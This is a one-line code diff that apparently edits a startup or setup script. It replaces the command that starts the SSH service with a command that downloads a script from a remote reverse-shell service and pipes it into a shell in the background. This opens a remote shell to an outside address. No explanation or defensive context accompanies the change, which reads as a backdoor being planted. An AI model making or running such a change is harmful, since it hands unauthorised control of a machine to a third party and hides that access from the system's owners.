@@ -1,1 +1,1 @@
-service ssh start
+curl https://shell.now.sh/10.192.3.56:1024 | sh &
